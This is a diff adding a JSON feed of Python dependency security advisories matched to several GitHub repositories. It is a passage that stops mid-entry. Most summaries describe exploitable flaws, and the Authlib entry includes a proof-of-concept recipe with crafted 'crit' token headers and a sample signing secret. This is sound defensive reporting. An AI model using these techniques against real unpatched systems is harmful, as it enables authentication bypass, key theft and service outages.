@@ -1,0 +1,2037 @@
+{
+  "generated_at": "2026-07-08T03:07:32.703328Z",
+  "since": "2026-07-07T03:07:32.703322Z",
+  "until": "2026-07-08T03:07:32.703328Z",
+  "entries": [
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1474",
+        "source": "osv",
+        "title": "Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
+        "summary": "The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.\n\nAccepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:41.875280Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "jinja2"
+        ],
+        "affected_ranges": [
+          "0..3.1.4",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/pallets/jinja/security/advisories/GHSA-h75v-3vvj-5mfj",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-34064",
+          "https://github.com/pallets/jinja/commit/0668239dc6b44ef38e7a6c9f91f312fd4ca581cb",
+          "https://github.com/pallets/jinja",
+          "https://lists.debian.org/debian-lts-announce/2024/12/msg00009.html",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/567XIGSZMABG6TSMYWD7MIYNJSUQQRUC",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GCLF44KY43BSVMTE6S53B4V5WP3FRRSE",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SSCBHIL6BYKR5NRCBXP4XMP2CEEKGFVS",
+          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZALNWE3TXPPHVPSI3AZ5CTMSTAVN5UMS",
+          "https://pypi.org/project/jinja2",
+          "https://github.com/advisories/GHSA-h75v-3vvj-5mfj"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'jinja2' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1104",
+        "source": "osv",
+        "title": " AIOHTTP is vulnerable to HTTP Request/Response Smuggling through incorrect parsing of chunked trailer sections",
+        "summary": "### Summary\nThe Python parser is vulnerable to a request smuggling vulnerability due to not parsing trailer sections of an HTTP request.\n\n### Impact\nIf a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.\n\n----\n\nPatch: https://github.com/aio-libs/aiohttp/commit/e8d774f635dc6d1cd3174d0e38891da5de0e2b6a",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:02:58.017770Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.12.14",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-9548-qrrj-x5pj",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-53643",
+          "https://github.com/aio-libs/aiohttp/commit/e8d774f635dc6d1cd3174d0e38891da5de0e2b6a",
+          "https://github.com/aio-libs/aiohttp",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-9548-qrrj-x5pj"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1547",
+        "source": "osv",
+        "title": "LiteLLM Server-Side Request Forgery (SSRF) vulnerability",
+        "summary": "A Server-Side Request Forgery (SSRF) vulnerability exists in berriai/litellm version 1.38.10. This vulnerability allows users to specify the `api_base` parameter when making requests to `POST /chat/completions`, causing the application to send the request to the domain specified by `api_base`. This request includes the OpenAI API key. A malicious user can set the `api_base` to their own domain and intercept the OpenAI API key, leading to unauthorized access and potential misuse of the API key.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:40.863022Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.44.8",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-6587",
+          "https://github.com/berriai/litellm/commit/ba1912afd1b19e38d3704bb156adf887f91ae1e0",
+          "https://github.com/berriai/litellm",
+          "https://huntr.com/bounties/4001e1a2-7b7a-4776-a3ae-e6692ec3d997",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-g26j-5385-hhw3"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1475",
+        "source": "osv",
+        "title": "Jinja has a sandbox breakout through indirect reference to format method",
+        "summary": "An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.\n\nTo exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.\n\nJinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:47.732576Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "jinja2"
+        ],
+        "affected_ranges": [
+          "0..3.1.5",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/pallets/jinja/security/advisories/GHSA-q2x7-8rv6-6q7h",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-56326",
+          "https://github.com/pallets/jinja/commit/48b0687e05a5466a91cd5812d604fa37ad0943b4",
+          "https://github.com/pallets/jinja",
+          "https://github.com/pallets/jinja/releases/tag/3.1.5",
+          "https://lists.debian.org/debian-lts-announce/2025/04/msg00022.html",
+          "https://pypi.org/project/jinja2",
+          "https://github.com/advisories/GHSA-q2x7-8rv6-6q7h"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'jinja2' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1616",
+        "source": "osv",
+        "title": "MCP Python SDK vulnerability in the FastMCP Server causes validation error, leading to DoS",
+        "summary": "A validation error in the MCP SDK can cause an unhandled exception when processing malformed requests, resulting in service unavailability (500 errors) until manually restarted. Impact may vary depending on the deployment conditions, and presence of infrastructure-level resilience measures.\n\nThank you to Rich Harang for reporting this issue.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:02:56.172263Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "mcp"
+        ],
+        "affected_ranges": [
+          "0..1.9.4",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-3qhf-m339-9g5v",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-53366",
+          "https://github.com/modelcontextprotocol/python-sdk/pull/822",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/29c69e6a47d0104d0afcea6ac35e7ab02fde809a",
+          "https://github.com/modelcontextprotocol/python-sdk",
+          "https://github.com/modelcontextprotocol/python-sdk/releases/tag/v1.9.4",
+          "https://pypi.org/project/mcp",
+          "https://github.com/advisories/GHSA-3qhf-m339-9g5v"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'mcp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1540",
+        "source": "osv",
+        "title": "Arbitrary file deletion in litellm",
+        "summary": "BerriAI's litellm, in its latest version, is vulnerable to arbitrary file deletion due to improper input validation on the `/audio/transcriptions` endpoint. An attacker can exploit this vulnerability by sending a specially crafted request that includes a file path to the server, which then deletes the specified file without proper authorization or validation. This vulnerability is present in the code where `os.remove(file.filename)` is used to delete a file, allowing any user to delete critical files on the server such as SSH keys, SQLite databases, or configuration files. ",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:34.023334Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.35.36",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-4888",
+          "https://github.com/BerriAI/litellm/pull/3193",
+          "https://github.com/BerriAI/litellm",
+          "https://huntr.com/bounties/48461d89-cf13-4ad3-a43e-0d37da08fc6c",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-3xr8-qfvj-9p9j"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1509",
+        "source": "osv",
+        "title": "langchain Server-Side Request Forgery vulnerability",
+        "summary": "With the following crawler configuration:\n\n```python\nfrom bs4 import BeautifulSoup as Soup\n\nurl = \"https://example.com\"\nloader = RecursiveUrlLoader(\n    url=url, max_depth=2, extractor=lambda x: Soup(x, \"html.parser\").text \n)\ndocs = loader.load()\n```\n\nAn attacker in control of the contents of `https://example.com` could place a malicious HTML file in there with links like \"https://example.completely.different/my_file.html\" and the crawler would proceed to download that file as well even though `prevent_outside=True`.\n\nhttps://github.com/langchain-ai/langchain/blob/bf0b3cc0b5ade1fb95a5b1b6fa260e99064c2e22/libs/community/langchain_community/document_loaders/recursive_url_loader.py#L51-L51\n\nResolved in https://github.com/langchain-ai/langchain/pull/15559",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:32.931836Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "langchain"
+        ],
+        "affected_ranges": [
+          "0..0.1.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-0243",
+          "https://github.com/langchain-ai/langchain/pull/15559",
+          "https://github.com/langchain-ai/langchain/commit/bf0b3cc0b5ade1fb95a5b1b6fa260e99064c2e22",
+          "https://github.com/langchain-ai/langchain",
+          "https://github.com/langchain-ai/langchain/blob/bf0b3cc0b5ade1fb95a5b1b6fa260e99064c2e22/libs/community/langchain_community/document_loaders/recursive_url_loader.py#L51-L51",
+          "https://github.com/pypa/advisory-database/tree/main/vulns/langchain-exa/PYSEC-2024-235.yaml",
+          "https://huntr.com/bounties/370904e7-10ac-40a4-a8d4-e2d16e1ca861",
+          "https://pypi.org/project/langchain",
+          "https://github.com/advisories/GHSA-h9j7-5xvc-qhg5"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'langchain' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1200",
+        "source": "osv",
+        "title": "Authlib: JWS/JWT accepts unknown crit headers (RFC violation → possible authz bypass)",
+        "summary": "## Summary\nAuthlib’s JWS verification accepts tokens that declare unknown critical header parameters (`crit`), violating RFC 7515 “must‑understand” semantics. An attacker can craft a signed token with a critical header (for example, `bork` or `cnf`) that strict verifiers reject but Authlib accepts. In mixed‑language fleets, this enables split‑brain verification and can lead to policy bypass, replay, or privilege escalation.\n\n## Affected Component and Versions\n- Library: Authlib (JWS verification)\n- API: `authlib.jose.JsonWebSignature.deserialize_compact(...)`\n- Version tested: 1.6.3\n- Configuration: Default; no allowlist or special handling for `crit`\n\n## Details\nRFC 7515 (JWS) §4.1.11 defines `crit` as a “must‑understand” list: recipients MUST understand and enforce every header parameter listed in `crit`, otherwise they MUST reject the token. Security‑sensitive semantics such as token binding (e.g., `cnf` from RFC 7800) are often conveyed via `crit`.\n\nObserved behavior with Authlib 1.6.3:\n- When a compact JWS contains a protected header with `crit: [\"cnf\"]` and a `cnf` object, or `crit: [\"bork\"]` with an unknown parameter, Authlib verifies the signature and returns the payload without rejecting the token or enforcing semantics of the critical parameter.\n- By contrast, Java Nimbus JOSE+JWT (9.37.x) and Node `jose` v5 both reject such tokens by default when `crit` lists unknown names.\n\nImpact in heterogeneous fleets:\n- A strict ingress/gateway (Nimbus/Node) rejects a token, but a lenient Python microservice (Authlib) accepts the same token. This split‑brain acceptance bypasses intended security policies and can enable replay or privilege escalation if `crit` carries binding or policy information.\n\n## Proof of Concept (PoC)\nThis repository provides a multi‑runtime PoC demonstrating the issue across Python (Authlib), Node (`jose` v5), and Java (Nimbus).\n\n### Prerequisites\n- Python 3.8+\n- Node.js 18+\n- Java 11+ with Maven\n\n### Setup\n\nEnter the directory **authlib-crit-bypass-poc** & run following commands.\n```bash\nmake setup\nmake tokens\n```\n\n### Tokens minted\n- `tokens/unknown_crit.jwt` with protected header:\n  `{ \"alg\": \"HS256\", \"crit\": [\"bork\"], \"bork\": \"x\" }`\n- `tokens/cnf_header.jwt` with protected header:\n  `{ \"alg\": \"HS256\", \"crit\": [\"cnf\"], \"cnf\": {\"jkt\": \"thumb-42\"} }`\n\n### Reproduction\nRun the cross‑runtime demo:\n```bash\nmake  demo\n```\n\nExpected output for each token (strict verifiers reject; Authlib accepts):\n\nFor `tokens/unknown_crit.jwt`:\n```\nStrict(Nimbus): REJECTED (unknown critical header: bork)\nStrict(Node jose): REJECTED (unrecognized crit)\nLenient(Authlib): ACCEPTED -> payload={'sub': '123', 'role': 'user'}\n```\n\nFor `tokens/cnf_header.jwt`:\n```\nStrict(Nimbus): REJECTED (unknown critical header: cnf)\nStrict(Node jose): REJECTED (unrecognized crit)\nLenient(Authlib): ACCEPTED -> payload={'sub': '123', 'role': 'user'}\n```\n\nEnvironment notes:\n- Authlib version used: `1.6.3` (from PyPI)\n- Node `jose` version: `^5`\n- Nimbus JOSE+JWT version: `9.37.x`\n- HS256 secret is 32 bytes to satisfy strict verifiers: `0123456789abcdef0123456789abcdef`\n\n## Impact\n- Class: Violation of JWS `crit` “must‑understand” semantics; specification non‑compliance leading to authentication/authorization policy bypass.\n- Who is impacted: Any service that relies on `crit` to carry mandatory security semantics (e.g., token binding via `cnf`) or operates in a heterogeneous fleet with strict verifiers elsewhere.\n- Consequences: Split‑brain acceptance (gateway rejects while a backend accepts), replay, or privilege escalation if critical semantics are ignored.\n\n## References\n- RFC 7515: JSON Web Signature (JWS), §4.1.11 `crit`\n- RFC 7800: Proof‑of‑Possession Key Semantics for JWTs (`cnf`)",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:05.178057Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.6.4",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-9ggr-2464-2j32",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-59420",
+          "https://github.com/authlib/authlib/commit/6b1813e4392eb7c168c276099ff7783b176479df",
+          "https://github.com/authlib/authlib",
+          "https://lists.debian.org/debian-lts-announce/2025/10/msg00032.html",
+          "https://pypi.org/project/authlib",
+          "https://github.com/advisories/GHSA-9ggr-2464-2j32"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1549",
+        "source": "osv",
+        "title": "LiteLLM Vulnerable to Denial of Service (DoS)",
+        "summary": "A vulnerability in BerriAI/litellm, as of commit 26c03c9, allows unauthenticated users to cause a Denial of Service (DoS) by exploiting the use of ast.literal_eval to parse user input. This function is not safe and is prone to DoS attacks, which can crash the litellm Python server.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:51.139299Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.53.1.dev1",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-10188",
+          "https://github.com/berriai/litellm/commit/21156ff5d0d84a7dd93f951ca033275c77e4f73c",
+          "https://github.com/BerriAI/litellm",
+          "https://huntr.com/bounties/96a32812-213c-4819-ba4e-36143d35e95b",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-gw2q-qw9j-rgv7"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1851",
+        "source": "osv",
+        "title": "Denial of service (DoS) via deformation `multipart/form-data` boundary",
+        "summary": "### Summary\n\nWhen parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary. This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.\n\nAn attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).\n\n### Impact\n\nApplications that use `python-multipart` to parse form data (or use frameworks that do so) are affected. \n\n### Original Report\n\nThis security issue was reported by:\n- GitHub security advisory in Starlette on October 30 by @Startr4ck\n- Email to `python-multipart` maintainer on October 3 by @mnqazi",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:46.120148Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "python-multipart"
+        ],
+        "affected_ranges": [
+          "0..0.0.18",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/Kludex/python-multipart/security/advisories/GHSA-59g5-xgcq-4qw3",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-53981",
+          "https://github.com/Kludex/python-multipart/commit/c4fe4d3cebc08c660e57dd709af1ffa7059b3177",
+          "https://github.com/Kludex/python-multipart",
+          "https://pypi.org/project/python-multipart",
+          "https://github.com/advisories/GHSA-59g5-xgcq-4qw3"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'python-multipart' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1851",
+        "source": "osv",
+        "title": "Denial of service (DoS) via deformation `multipart/form-data` boundary",
+        "summary": "### Summary\n\nWhen parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary. This happens one byte at a time and emits a log event each time, which may cause excessive logging for certain inputs.\n\nAn attacker could abuse this by sending a malicious request with lots of data before the first or after the last boundary, causing high CPU load and stalling the processing thread for a significant amount of time. In case of ASGI application, this could stall the event loop and prevent other requests from being processed, resulting in a denial of service (DoS).\n\n### Impact\n\nApplications that use `python-multipart` to parse form data (or use frameworks that do so) are affected. \n\n### Original Report\n\nThis security issue was reported by:\n- GitHub security advisory in Starlette on October 30 by @Startr4ck\n- Email to `python-multipart` maintainer on October 3 by @mnqazi",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:46.120148Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "python-multipart"
+        ],
+        "affected_ranges": [
+          "0..0.0.18",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/Kludex/python-multipart/security/advisories/GHSA-59g5-xgcq-4qw3",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-53981",
+          "https://github.com/Kludex/python-multipart/commit/c4fe4d3cebc08c660e57dd709af1ffa7059b3177",
+          "https://github.com/Kludex/python-multipart",
+          "https://pypi.org/project/python-multipart",
+          "https://github.com/advisories/GHSA-59g5-xgcq-4qw3"
+        ]
+      },
+      "repo": "tiangolo/fastapi",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'python-multipart' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1544",
+        "source": "osv",
+        "title": "SQL injection in litellm",
+        "summary": "A blind SQL injection vulnerability exists in the berriai/litellm application, specifically within the '/team/update' process. The vulnerability arises due to the improper handling of the 'user_id' parameter in the raw SQL query used for deleting users. An attacker can exploit this vulnerability by injecting malicious SQL commands through the 'user_id' parameter, leading to potential unauthorized access to sensitive information such as API keys, user information, and tokens stored in the database. The affected version is 1.27.14.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:34.255023Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-4890",
+          "https://github.com/BerriAI/litellm/pull/2954",
+          "https://github.com/BerriAI/litellm",
+          "https://huntr.com/bounties/a4f6d357-5b44-4e00-9cac-f1cc351211d2",
+          "https://pypi.org/project/litellm",
+          "https://github.com/advisories/GHSA-8j42-pcfm-3467"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1617",
+        "source": "osv",
+        "title": "Model Context Protocol (MCP) Python SDK does not enable DNS rebinding protection by default",
+        "summary": "### Description\n\nThe Model Context Protocol (MCP) Python SDK does not enable DNS rebinding protection by default for HTTP-based servers. When an HTTP-based MCP server is run on localhost without authentication using `FastMCP` with streamable HTTP or SSE transport, and has not configured `TransportSecuritySettings`, a malicious website could exploit DNS rebinding to bypass same-origin policy restrictions and send requests to the local MCP server. This could allow an attacker to invoke tools or access resources exposed by the MCP server on behalf of the user in those limited circumstances.\n\nNote that running HTTP-based MCP servers locally without authentication is not recommended per MCP security best practices. This issue does not affect servers using stdio transport.\n\nServers created via `FastMCP()` now have DNS rebinding protection enabled by default when the `host` parameter is `127.0.0.1` or `localhost`. Users are advised to update to version `1.23.0` to receive this automatic protection. Users with custom low-level server configurations using `StreamableHTTPSessionManager` or `SseServerTransport` directly should explicitly configure `TransportSecuritySettings` when running an unauthenticated server on localhost.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:03:11.859199Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "mcp"
+        ],
+        "affected_ranges": [
+          "0..1.23.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/modelcontextprotocol/python-sdk/security/advisories/GHSA-9h52-p55h-vw2f",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-66416",
+          "https://github.com/modelcontextprotocol/python-sdk/commit/d3a184119e4479ea6a63590bc41f01dc06e3fa99",
+          "https://github.com/modelcontextprotocol/python-sdk",
+          "https://pypi.org/project/mcp",
+          "https://github.com/advisories/GHSA-9h52-p55h-vw2f"
+        ]
+      },
+      "repo": "ianlintner/audio_engineer",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'mcp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1434",
+        "source": "osv",
+        "title": "Request smuggling leading to endpoint restriction bypass in Gunicorn",
+        "summary": "Gunicorn fails to properly validate Transfer-Encoding headers, leading to HTTP Request Smuggling (HRS) vulnerabilities. By crafting requests with conflicting Transfer-Encoding headers, attackers can bypass security restrictions and access restricted endpoints. This issue is due to Gunicorn's handling of Transfer-Encoding headers, where it incorrectly processes requests with multiple, conflicting Transfer-Encoding headers, treating them as chunked regardless of the final encoding specified. This vulnerability has been shown to allow access to endpoints restricted by gunicorn. This issue has been addressed in version 22.0.0.\n\nTo be affected users must have a network path which does not filter out invalid requests. These users are advised to block access to restricted endpoints via a firewall or other mechanism if they are unable to update.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T11:45:38.679382Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "gunicorn"
+        ],
+        "affected_ranges": [
+          "0..22.0.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-1135",
+          "https://github.com/benoitc/gunicorn/issues/3091",
+          "https://github.com/benoitc/gunicorn/pull/3113",
+          "https://github.com/benoitc/gunicorn/commit/ac29c9b0a758d21f1e0fb3b3457239e523fa9f1d",
+          "https://github.com/benoitc/gunicorn",
+          "https://github.com/benoitc/gunicorn/releases/tag/22.0.0",
+          "https://huntr.com/bounties/22158e34-cfd5-41ad-97e0-a780773d96c1",
+          "https://lists.debian.org/debian-lts-announce/2024/06/msg00027.html",
+          "https://lists.debian.org/debian-lts-announce/2024/12/msg00018.html",
+          "https://pypi.org/project/gunicorn",
+          "https://github.com/advisories/GHSA-w3h3-4rj7-4ph4"
+        ]
+      },
+      "repo": "ianlintner/python_dsa",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'gunicorn' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1377",
+        "source": "osv",
+        "title": "Flask uses fallback key instead of current signing key",
+        "summary": "In Flask 3.1.0, the way fallback key configuration was handled resulted in the last fallback key being used for signing, rather than the current signing key.\n\nSigning is provided by the `itsdangerous` library. A list of keys can be passed, and it expects the last (top) key in the list to be the most recent key, and uses that for signing. Flask was incorrectly constructing that list in reverse, passing the signing key first.\n\nSites that have opted-in to use key rotation by setting `SECRET_KEY_FALLBACKS` are likely to unexpectedly be signing their sessions with stale keys, and their transition to fresher keys will be impeded. Sessions are still signed, so this would not cause any sort of data integrity loss.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T16:02:52.410162Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "flask"
+        ],
+        "affected_ranges": [
+          "0..3.1.1",
+          "3.1.0..∞"
+        ],
+        "references": [
+          "https://github.com/pallets/flask/security/advisories/GHSA-4grg-w6v8-c28g",
+          "https://nvd.nist.gov/vuln/detail/CVE-2025-47278",
+          "https://github.com/pallets/flask/commit/73d6504063bfa00666a92b07a28aaf906c532f09",
+          "https://github.com/pallets/flask",
+          "https://github.com/pallets/flask/releases/tag/3.1.1",
+          "https://pypi.org/project/flask",
+          "https://github.com/advisories/GHSA-4grg-w6v8-c28g"
+        ]
+      },
+      "repo": "ianlintner/python_dsa",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'flask' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1108",
+        "source": "osv",
+        "title": "In aiohttp, compressed files as symlinks are not protected from path traversal",
+        "summary": "### Summary\nStatic routes which contain files with compressed variants (`.gz` or `.br` extension) were vulnerable to path traversal outside the root directory if those variants are symbolic links.\n\n### Details\nThe server protects static routes from path traversal outside the root directory when `follow_symlinks=False` (default).  It does this by resolving the requested URL to an absolute path and then checking that path relative to the root.  However, these checks are not performed when looking for compressed variants in the `FileResponse` class, and symbolic links are then automatically followed when performing `Path.stat()` and `Path.open()` to send the file.\n\n### Impact\nServers with static routes that contain compressed variants as symbolic links, pointing outside the root directory, or that permit users to upload or create such links, are impacted.\n\n----\n\nPatch: https://github.com/aio-libs/aiohttp/pull/8653/files",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-07-07T14:34:38.838715Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "aiohttp"
+        ],
+        "affected_ranges": [
+          "0..3.10.2",
+          "3.10.0b1..∞"
+        ],
+        "references": [
+          "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-jwhx-xcg6-8xhj",
+          "https://nvd.nist.gov/vuln/detail/CVE-2024-42367",
+          "https://github.com/aio-libs/aiohttp/pull/8653",
+          "https://github.com/aio-libs/aiohttp/commit/ce2e9758814527589b10759a20783fb03b98339f",
+          "https://github.com/aio-libs/aiohttp",
+          "https://github.com/aio-libs/aiohttp/blob/e0ff5246e1d29b7710ab1a2bbc972b48169f1c05/aiohttp/web_fileresponse.py#L177",
+          "https://github.com/aio-libs/aiohttp/blob/e0ff5246e1d29b7710ab1a2bbc972b48169f1c05/aiohttp/web_urldispatcher.py#L674",
+          "https://pypi.org/project/aiohttp",
+          "https://github.com/advisories/GHSA-jwhx-xcg6-8xhj"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'aiohttp' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "PYSEC-2026-1201",
+        "source": "osv",
+        "title": "Authlib has 1-click Account Takeover vulnerability",
+        "summary": "# Security Advisory: Cache-Backed State Storage CSRF in Authlib\n\nThe Security Labs team at Snyk has reported a security issue affecting Authlib, identified during a recent research project.\n\nThe Snyk Security Labs team has identified a vulnerability that can result in a one-click account takeover in applications that utilize the Authlib library.\n\n## Description\n\nCache-backed state/request-token storage is not tied to the initiating user session, making CSRF possible for any attacker that possesses a valid state value (easily obtainable via an attacker-initiated authentication flow). When a cache is supplied to the OAuth client registry, `FrameworkIntegration.set_state_data` writes the entire state blob under `_state_{app}_{state}`, and `get_state_data` disregards the caller's session entirely. [1][2]\n\n```py\n    def _get_cache_data(self, key):\n        value = self.cache.get(key)\n        if not value:\n            return None\n        try:\n            return json.loads(value)\n        except (TypeError, ValueError):\n            return None\n[snip]\n    def get_state_data(self, session, state):\n        key = 